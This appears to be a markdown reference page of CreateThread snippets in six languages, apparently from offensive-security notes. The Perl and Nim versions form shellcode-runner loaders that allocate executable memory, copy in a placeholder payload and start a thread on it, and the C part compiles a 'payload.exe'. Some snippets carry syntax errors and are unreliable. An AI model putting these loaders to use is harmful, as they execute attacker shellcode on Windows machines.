# CreateThread

## Python

```python
import ctypes

kernel32 = ctypes.windll.kernel32

CreateThread = kernel32.CreateThread

CreateThread.argtypes = [
	wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
	wt.LPVOID, wt.DWORD, wt.LPVOID
]
```

## Perl

```perl
use Win32::API;

my $shellcode = "<c_shellcode>";

$move_memory = new Win32::API('kernel32', 'RtlMoveMemory', 'IPI', 'V');
$createthread = new Win32::API('kernel32', 'CreateThread', 'IIIIIP', 'I');
$waitforsingleobject = new Win32::API('kernel32', 'WaitForSingleObject', 'II', 'I');
$virtualalloc = new Win32::API('kernel32', 'VirtualAlloc', 'IIII', 'I');
$virtualprotect = new Win32::API('kernel32', 'VirtualProtect', 'PIIP', 'I');

my $code = $virtualalloc->Call(0, length($shellcode), 0x1000, 0x04);
$move_memory->Call($code, $shellcode, length($shellcode));

my $allocate = $virtualprotect->Call(code, length($shellcode), 0x20, 0);

my $thread = $createthread->Call(0, 0, $code, 0, 0, 0);

$waitforsingleobject->Call($thread, -1);
```

## PowerShell

```powershell
$Win32Functions = New-Object System.Object

$CreateThreadAddress = Get-ProcAddress Kernel32.dll CreateThread
$CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddress, $CreateThreadDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
```

## C

```c
#include <windows.h>
#include <processthreadsapi.h>

#pragma comment(lib, "kernel32.lib")

CreateThread()
```

```
$ x86_64-w64-mingw32-gcc -l user32 -o payload.exe payload.c
```

## C\#

```cs
#region DLLIMPORTS
[DllImport("kernel32.dll", SetLastError = true)]
private unsafe static extern uint CreateThread(
        uint* lpThreadAttributes,
        uint dwStackSize,
        ThreadStart lpStartAddress,
        uint* lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);
#endregion

IntPtr thread_handle = CreateThread(0, 0, heap, IntPtr.Zero, 0, IntPtr.Zero);
```

## Nim

```nim
import winim

var buffer: array[4, byte] = [0xDE]

var address = winim.VirtualAlloc(NULL,
                                cast[SIZE_T](buffer.len)
                                MEM_COMMIT,
                                PAGE_EXECUTE_READWRITE
                                )

copyMem(address, addr(buffer), cast[SIZE_T](buffer.len))

var thread_handle = CreateThread(NULL,
                                0,
                                cast[LPTHREAD_START_ROUTINE)(address),
                                NULL,
                                0,
                                NULL
                                )

WaitForSingleObject(thread_handle, -1)
CloseHandle(thread_handle)
```

---
## References

### Source Repositories

- [Chvancooten: Process Hollowing](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing)

### Tenouk

- [Tenouk: Processes and Threads - C Run-Time - Part 1](https://www.tenouk.com/ModuleR.html)

- [Tenouk: Processes and Threads - C Run-Time - Part 4](https://www.tenouk.com/ModuleS.html)

- [Tenouk: Processes and Threads - WinAPI - Part 6](https://www.tenouk.com/ModuleU.html)

- [Tenouk: Processes and Threads - WinAPI - Part 8](https://www.tenouk.com/ModuleU2.html)

- [Tenouk: Processes and Threads - WinAPI - Part 10](https://www.tenouk.com/ModuleU4.html)

- [Tenouk: Windows Programming - Various Supplementary Note](https://www.tenouk.com/cddeefunction2.html)

### PInvoke

- [Pinvoke: createthread (kernel32)](https://www.pinvoke.net/default.aspx/kernel32.createthread)